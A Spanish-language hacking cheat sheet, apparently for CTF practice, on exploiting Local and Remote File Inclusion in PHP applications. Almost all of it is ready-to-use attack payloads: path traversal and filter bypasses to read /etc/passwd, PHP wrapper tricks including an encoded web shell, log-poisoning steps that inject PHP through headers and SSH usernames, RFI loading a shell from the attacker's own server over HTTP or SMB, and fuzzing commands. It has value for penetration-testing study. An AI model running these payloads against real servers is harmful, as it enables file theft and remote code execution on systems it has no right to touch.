# 📂 Inclusión de Archivos (LFI & RFI)

**Definición:** Vulnerabilidad web que permite al atacante controlar dinámicamente qué archivo carga, lee o ejecuta el servidor. Es sumamente común en aplicaciones PHP mal programadas que usan funciones como `include()`, `require()`, o `file_get_contents()`.

---

## 🏠 1. Local File Inclusion (LFI)
El servidor lee o ejecuta archivos *locales* (que ya existen en la máquina víctima).

### Vector Básico (Path Traversal)
Se abusa de los saltos de directorio (`../`) para retroceder a la raíz (`/`) y leer archivos del sistema.
* **Linux:** `?page=../../../../../../etc/passwd`
* **Windows:** `?page=../../../../../../windows/win.ini` o `boot.ini`

### 🛡️ Evasión de Filtros (Bypasses comunes en CTFs)
Si el servidor bloquea el `../` clásico o le añade extensiones forzadas (ej. `.php`), prueba esto:
1. **Null Byte (`%00`):** Engaña a versiones antiguas de PHP para que ignoren cualquier extensión que el servidor intente añadir al final.
   `?page=../../../../../../etc/passwd%00`
2. **Doble URL Encoding:** Evade filtros básicos de firewall (WAF).
   `?page=%252e%252e%252f%252e%252e%252fetc%2fpasswd`
3. **Eliminación recursiva:** Si el firewall borra los `../`, usamos secuencias anidadas para que al borrar una, se forme otra.
   `?page=....//....//....//etc/passwd`

---

## 2. Magia Negra con "Wrappers" de PHP
Si el servidor usa `include()`, podemos usar Wrappers de PHP nativos para transformar el LFI en lectura de código fuente o en RCE directo.

1. **Lectura de Código Fuente (Base64):** Si intentas leer `index.php`, el servidor lo ejecutará y no verás el código. Usamos este filtro para que nos devuelva el código en texto plano codificado.
   `?page=php://filter/convert.base64-encode/resource=index.php`
2. **RCE Directo con Data Wrapper:** Si `allow_url_include` está activo, podemos inyectar código PHP directamente en la URL en formato base64.
   `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami`
3. **RCE Directo con Input Wrapper:** Mandamos el comando malicioso por POST.
   *URL:* `?page=php://input`
   *Cuerpo POST:* `<?php system('whoami'); ?>`

---

## 3. De LFI a RCE (Log Poisoning)
Si no funcionan los wrappers pero podemos *leer* archivos de registros (Logs), inyectamos código malicioso en ellos y luego usamos el LFI para ejecutarlos.

1. **Apache / Nginx (Access Logs):**
   * Leer: `/var/log/apache2/access.log`
   * Inyectar: Cambia tu `User-Agent` (en BurpSuite) por `<?php system($_GET['c']); ?>`.
   * Ejecutar: `?page=/var/log/apache2/access.log&c=id`
2. **SSH (Auth Logs):**
   * Leer: `/var/log/auth.log`
   * Inyectar: Intenta conectarte por SSH con un usuario falso que sea código PHP:
     `ssh '<?php system($_GET["c"]); ?>'@10.10.10.X`
   * Ejecutar: `?page=/var/log/auth.log&c=whoami`
3. **Procesos (Environ):**
   * Leer: `/proc/self/environ`
   * Inyectar: Pasa el código PHP a través del User-Agent.

---

## 4. Remote File Inclusion (RFI)
El servidor víctima descarga y ejecuta un script alojado en **tu** servidor.

* **Requisito PHP:** `allow_url_include = On` (Casi siempre viene apagado hoy en día).
* **Ejecución Clásica:**
  1. Levantas servidor local: `python3 -m http.server 80`
  2. Acomodas tu payload: `shell.php`
  3. Explotas: `?page=http://<IP_KALI>/shell.php`

**Truco RFI en Windows (Bypass vía SMB):**
Si el servidor es Windows y `allow_url_include` está en `Off`, **aún puedes hacer RFI** usando un servidor SMB (Samba) en lugar de HTTP. PHP en Windows trata a los recursos compartidos SMB como si fueran rutas locales.
* Explotación: `?page=\\<IP_KALI>\share\shell.php`

---

## 5. Cheatsheet de Fuzzing
Comandos rápidos para buscar parámetros vulnerables usando diccionarios masivos (como `LFI-Jhaddix.txt` de SecLists).

**Descubrir qué parámetro es vulnerable a LFI:**
`ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://10.10.10.X/index.php?FUZZ=../../../../etc/passwd -fs <TAMAÑO_BASE>`

**Fuzzear buscando archivos comunes en Linux cuando ya tienes el LFI:**
`ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://10.10.10.X/index.php?page=FUZZ -fs <TAMAÑO_ERROR>`